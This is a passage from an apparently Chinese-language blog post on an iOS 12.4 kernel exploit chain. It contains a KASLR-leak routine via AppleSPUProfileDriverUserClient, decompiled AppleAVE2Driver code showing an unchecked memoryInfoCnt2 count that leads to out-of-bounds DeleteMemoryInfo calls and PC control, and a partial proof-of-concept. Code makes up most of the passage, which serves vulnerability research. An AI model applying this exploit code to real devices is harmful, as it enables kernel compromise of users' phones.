size_t search_size = map_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((start_addr = (uint64_t)memmem((<span class="keyword">const</span> <span class="type">void</span> *)start_addr, search_size, &amp;search_val, <span class="keyword">sizeof</span>(search_val))))</span><br><span class="line">    &#123;</span><br><span class="line">        uint64_t tmpcalc = *(uint64_t *)(start_addr - <span class="number">4</span>) - INFOLEAK_ADDR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// kaslr offset always be 0x1000 aligned</span></span><br><span class="line">        <span class="keyword">if</span> ((tmpcalc &amp; <span class="number">0xFFF</span>) == <span class="number">0x0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> tmpcalc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start_addr += <span class="keyword">sizeof</span>(search_val);</span><br><span class="line">        search_size = (uint64_t)map_addr + search_size - start_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mach_vm_offset_t get_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t scalarInput = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocte a new IOSharedDataQueue </span></span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kaslr_iter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!kaslr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// AppleSPUProfileDriverUserClient::extSignalBreak</span></span><br><span class="line">        <span class="comment">// Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack </span></span><br><span class="line">        IOConnectCallStructMethod(ioconn, <span class="number">11</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Map the IOSharedDataQueue and look for the leaked ptr </span></span><br><span class="line">        kaslr = check_memmap_for_kaslr(ioconn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kaslr_iter++ % <span class="number">5</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            scalarInput = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            scalarInput = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    scalarInput = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// Shutdown</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kaslr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击内核"><a href="#攻击内核" class="headerlink" title="攻击内核"></a>攻击内核</h3><p>最后一个漏洞是<code>AppleAVE2Driver</code>中缺少边界检查，<code>AppleAVE2</code>是iOS中的图形驱动程序，在本例中，可通过沙盒逃逸来访问<code>MIDIServer</code>。<code>userclient</code>公开了24个方法，这个漏洞存在于索引7的方法中：<code>_SetSessionSettings</code>，该方法获取一个大小为<code>0x108</code>的输入缓冲区，并通过<code>AppleAVE2Driver::GetIOSurfaceFromCSID</code>方法从输入缓冲区中提供的ID加载<code>IOSurface</code>，最后调用<code>AppleAVE2Driver::Enqueue</code>。具体来说，该方法将加载一个名为<code>InitInfoSurfaceld</code>或<code>InitInfoBuffer</code>的表：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !structIn-&gt;InitInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  initInfoSurfaceId = structIn-&gt;InitInfoSurfaceId;</span><br><span class="line">  <span class="keyword">if</span> ( initInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(<span class="variable language_">this</span>-&gt;provider, initInfoSurfaceId, <span class="variable language_">this</span>-&gt;task);</span><br><span class="line">    <span class="variable language_">this</span>-&gt;InitInfoBuffer = initInfoBuffer;</span><br><span class="line">    <span class="keyword">if</span> ( initInfoBuffer )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>AppleAVE2Driver::Enqueue</code>方法将在<code>IOSurface</code>上创建一个<code>IOSurfaceBufferMngr</code>实例：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">bufferMgr = operator new(<span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, <span class="number">0</span>LL, <span class="variable language_">this</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IOSurfaceBufferMngr::CreateBufferFromIOSurface(</span><br><span class="line">         bufferMgr,</span><br><span class="line">         service-&gt;InitInfoBuffer,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;iosurfaceRoot,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">128</span>],</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">136</span>],</span><br><span class="line">         <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap101[<span class="number">39</span>],</span><br><span class="line">         <span class="string">&quot;InitInfo&quot;</span>,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;gap3AF[<span class="number">49</span>],</span><br><span class="line">         <span class="number">0x1F4</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BD</span>LL;</span><br><span class="line">    v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr);</span><br><span class="line">    operator delete(v28);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( bufferMgr-&gt;size &lt; <span class="number">0x25DD0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buffMgrKernAddr = bufferMgr-&gt;kernelAddress;</span><br><span class="line">  <span class="keyword">if</span> ( !buffMgrKernAddr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>考虑到这个缓冲区中的数据(现在映射到<code>buffMgrKernAddr</code>)是由<code>userland</code>控制的，该方法将继续将缓冲区中的大块数据复制到<code>AVEClient*</code>对象中，现在将其命名为<code>currentClient</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">currentClient-&gt;unsigned2400 = *(buffMgrKernAddr + <span class="number">2008</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;unsigned2404, buffMgrKernAddr + <span class="number">2012</span>, <span class="number">0x2BE4</span>LL);</span><br><span class="line">  currentClient-&gt;oword5018 = *(buffMgrKernAddr + <span class="number">13296</span>);</span><br><span class="line">  currentClient-&gt;oword5008 = *(buffMgrKernAddr + <span class="number">13280</span>);</span><br><span class="line">  currentClient-&gt;oword4FF8 = *(buffMgrKernAddr + <span class="number">13264</span>);</span><br><span class="line">  currentClient-&gt;oword4FE8 = *(buffMgrKernAddr + <span class="number">13248</span>);</span><br><span class="line">  currentClient-&gt;oword5058 = *(buffMgrKernAddr + <span class="number">13360</span>);</span><br><span class="line">  currentClient-&gt;memoryInfoCnt2 = *(buffMgrKernAddr + <span class="number">0x3420</span>);</span><br><span class="line">  currentClient-&gt;oword5038 = *(buffMgrKernAddr + <span class="number">13328</span>);</span><br><span class="line">  currentClient-&gt;oword5028 = *(buffMgrKernAddr + <span class="number">13312</span>);</span><br><span class="line">  currentClient-&gt;oword5098 = *(buffMgrKernAddr + <span class="number">13424</span>);</span><br><span class="line">  currentClient-&gt;oword5088 = *(buffMgrKernAddr + <span class="number">13408</span>);</span><br><span class="line">  currentClient-&gt;oword5078 = *(buffMgrKernAddr + <span class="number">13392</span>);</span><br><span class="line">  currentClient-&gt;oword5068 = *(buffMgrKernAddr + <span class="number">13376</span>);</span><br><span class="line">  currentClient-&gt;oword50C8 = *(buffMgrKernAddr + <span class="number">13472</span>);</span><br><span class="line">  currentClient-&gt;oword50B8 = *(buffMgrKernAddr + <span class="number">13456</span>);</span><br><span class="line">  currentClient-&gt;oword50A8 = *(buffMgrKernAddr + <span class="number">13440</span>);</span><br><span class="line">  currentClient-&gt;qword50D8 = *(buffMgrKernAddr + <span class="number">13488</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br><span class="line">  memmove(&amp;currentClient-&gt;gap1C8C[<span class="number">0x5CC</span>], buffMgrKernAddr + <span class="number">1584</span>, <span class="number">0x1A8</span>LL);</span><br></pre></td></tr></table></figure>

<p>通过<code>AppleAVE2DriverUserClient::_ my_close</code>关闭<code>AppleAVE2Driver userclient</code>时，将调用一个名为<code>AppleAVE2Driver::AVE_DestroyContext</code>的函数，该函数位于该<code>userclient</code>关联的<code>AVEClient</code>对象上。<code>AVE_DestroyContext</code>在<code>AVEClient</code>中<code>MEMORY_INFO</code>结构上调用<code>AppleAVE2Driver::DeleteMemoryInfo</code>，并且在倒数第二步客户端的<code>MEMORY_INFO</code>结构数组上调用此函数，其数量由<code>memoryInfoCnt&#123;1,2&#125;</code>字段表示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">v73 = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v73 &lt;= currentClient-&gt;memoryInfoCnt2 )</span><br><span class="line">    v73 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v73 )</span><br><span class="line">  &#123;</span><br><span class="line">    iter1 = <span class="number">0</span>LL;</span><br><span class="line">    statsMapBufArr = currentClient-&gt;statsMapBufferArray;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      AppleAVE2Driver::DeleteMemoryInfo(<span class="variable language_">this</span>, statsMapBufArr);</span><br><span class="line">      ++iter1;</span><br><span class="line"></span><br><span class="line">      loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">      cnt2 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( loopMax &lt;= cnt2 )</span><br><span class="line">        loopMax = cnt2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        loopMax = loopMax;</span><br><span class="line"></span><br><span class="line">      statsMapBufArr += <span class="number">0x28</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( iter1 &lt; loopMax );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>_SetSessionSettings</code>中，对<code>memoryInfoCnt1</code>的值进行边界检查：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( currentClient-&gt;memoryInfoCnt1 &gt;= <span class="number">4</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  ret = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，没有检查<code>memoryInfoCnt2</code>的值，这里缺少检查，加上while循环中的逻辑，意味着如果提供足够大的<code>memoryInfoCnt2</code>值，循环将越界访问和调用<code>DeleteMemoryInfo</code>上的数据：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;  <span class="comment">// Take memoryInfoCnt1 (max 4), loopMax is &lt;=6</span></span><br><span class="line"></span><br><span class="line">cnt2 = currentClient-&gt;memoryInfoCnt2;         <span class="comment">// Take memoyInfoCnt2</span></span><br><span class="line"><span class="keyword">if</span> ( loopMax &lt;= cnt2 )                        <span class="comment">// if cnt2 is larger than loopMax...</span></span><br><span class="line">  loopMax = cnt2;                             <span class="comment">// update loopMax to the value of memoryInfoCnt2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  loopMax = loopMax;</span><br></pre></td></tr></table></figure>

<p>默认情况下，<code>statsMapBufferArray</code>中有5个<code>MEMORY_INFO</code>结构。由于每个大小为<code>0x28</code>，数组将占用<code>0xc8</code>字节。由于这个数组是在<code>AVEClient*</code>对象中内联的，当我们触发越界错误时，下一个<code>DeleteMemoryInfo</code>调用将使用<code>statsMapBufferArray</code>之后所有的数据。在我的<code>iPhone 8</code>的12.4内核上，这个数组的偏移量是<code>0x1b60</code>，也就是说第6项(第一个越界项)位于偏移量<code>0x1c28</code>处。</p>
<p>现在，还记得在<code>SetSessionSettings</code>中，如何将大块数据从用户控制的缓冲区复制到<code>AVEClient</code>对象中吗？恰好其中一个受控制缓冲区位于<code>statsMapBufferArray</code>字段之后!</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">AVEClient</span>       struc ; (<span class="keyword">sizeof</span>=<span class="number">0x29AC8</span>, align=<span class="number">0x8</span>, mappedto_215)</span><br><span class="line">[...]</span><br><span class="line"><span class="number">00001</span>B60 statsMapBufferArray DCB <span class="number">200</span> dup(?)</span><br><span class="line"><span class="number">00001</span>C28 sessionSettings_block1 DCB ?</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArray</span></span><br><span class="line">memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br></pre></td></tr></table></figure>

<p>因此，通过在复制到<code>AVEClient</code>的<code>IOSurface</code>缓冲区中提供精心构建的数据，我们完全可以控制越界数组条目。</p>
<h3 id="控制PC"><a href="#控制PC" class="headerlink" title="控制PC"></a>控制PC</h3><p>现在，我们看一下<code>AppleAVE2Driver::DeleteMemoryInfo</code>函数原型，记住我们对<code>memInfo</code>对象具有完全控制权限：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *<span class="variable language_">this</span>, IOSurfaceBufferMngr **memInfo)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( memInfo )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *memInfo )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo);</span><br><span class="line">      operator delete(v8);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(memInfo, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurfaceBufferMngr</code>的析构函数直接封装了一个静态的<code>IOSurfaceBufferMngr::RemoveBuffer</code>调用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  IOSurfaceBufferMngr::RemoveBuffer(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>RemoveBuffer</code>调用<code>IOSurfaceBufferMngr::CompleteFence</code>，在本例中，汇编代码如下：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line"></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line">                MOV             X19, X0                         <span class="comment">// x19 = x0 (controlled pointer)</span></span><br><span class="line">                LDR             X0, [X0,#<span class="number">0x58</span>]                  <span class="comment">// Loads x0-&gt;0x58</span></span><br><span class="line">                CBZ             X0, exit_stub                   <span class="comment">// Exits if the value is zero </span></span><br><span class="line">                LDRB            W8, [X19,#<span class="number">0x1E</span>]                 <span class="comment">// Loads some byte at x19-&gt;0x1e</span></span><br><span class="line">                CBNZ            W8, exit_stub                   <span class="comment">// Exits if the byte is non-zero</span></span><br><span class="line">                MOV             W1, #<span class="number">0</span></span><br><span class="line">                BL              IOFence::complete</span><br><span class="line">                LDR             X0, [X19,#<span class="number">0x58</span>]                 <span class="comment">// Loads x19-&gt;0x58</span></span><br><span class="line">                LDR             X8, [X0]                        <span class="comment">// Loads x0-&gt;0x0</span></span><br><span class="line">                LDR             X8, [X8,#<span class="number">0x28</span>]                  <span class="comment">// Loads function pointer x8-&gt;0x28</span></span><br><span class="line">                BLR             X8                              <span class="comment">// Branches to fptr, giving arbitrary PC control</span></span><br><span class="line">                STR             XZR, [X19,#<span class="number">0x58</span>]</span><br><span class="line"></span><br><span class="line">exit_stub</span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP+<span class="number">0x10</span>+var_10],#<span class="number">0x20</span></span><br><span class="line">                RET</span><br></pre></td></tr></table></figure>

<p>本质上，通过创建一个<code>userland</code>共享缓冲区，可以触发一个越界访问，这将直接在关闭<code>userclient</code>时提供任意PC控制。</p>
<p>下面是这个漏洞的PoC，它将使设备崩溃，并导致取消对地址<code>0x4141414142424242</code>的引用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> open_inputStruct[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> open_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t open_outputStruct_size = <span class="keyword">sizeof</span>(open_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_open</span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">0</span>, </span><br><span class="line">                                        open_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(open_inputStruct), </span><br><span class="line">                                        open_outputStruct, </span><br><span class="line">                                        &amp;open_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_open: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create an IOSurface using the IOSurface client owned by MIDIServer</span></span><br><span class="line">    <span class="comment">// Address &amp; size of the shared mapping created by IOSurface and</span></span><br><span class="line">    <span class="comment">// returned in the output struct at offsets 0x0 and 0x1c respectively</span></span><br><span class="line">    uint64_t surface_map_addr = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_map_size = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &amp;surface_map_addr, &amp;surface_map_size);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Got Surface ID: %d&quot;</span>, surface_id);</span><br><span class="line"></span><br><span class="line">    uintptr_t surface_data = malloc(surface_map_size);</span><br><span class="line">    bzero((<span class="type">void</span> *)surface_data, surface_map_size);</span><br><span class="line"></span><br><span class="line">    *(uint64_t *)(surface_data + <span class="number">0x0</span>) = <span class="number">0x4141414142424242</span>;     <span class="comment">// First pointer to memory containing function pointer</span></span><br><span class="line">                                                                <span class="comment">// This field is the start of the block adjacent to the stats array</span></span><br><span class="line">    *(uint32_t *)(surface_data + <span class="number">0x3420</span>) = <span class="number">6</span>;                   <span class="comment">// `memoryInfoCnt2` field, gives 1 OOB access</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sends the data to MIDIServer to be written onto the IOSurface</span></span><br><span class="line">    <span class="comment">// The MIDIServer ROP chain hangs on the following call:</span></span><br><span class="line">    <span class="comment">// vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...)</span></span><br><span class="line">    send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Waits for a message back from MIDIServer, sent by the ROP chain</span></span><br><span class="line">    <span class="comment">// Notifies us that the vm_read_overwrite call completed  </span></span><br><span class="line">    reply_notify_completion();</span><br><span class="line"></span><br><span class="line">    free(surface_data);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Write the OOB count value to the `currentClient` object, and write our adjacent data</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> setSessionSettings_inputStruct[<span class="number">0x108</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> setSessionSettings_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t setSessionSettings_outputStruct_size = <span class="keyword">sizeof</span>(setSessionSettings_outputStruct);</span><br><span class="line"></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x04</span>) = surface_id; <span class="comment">// FrameQueueSurfaceId</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x08</span>) = surface_id; <span class="comment">// 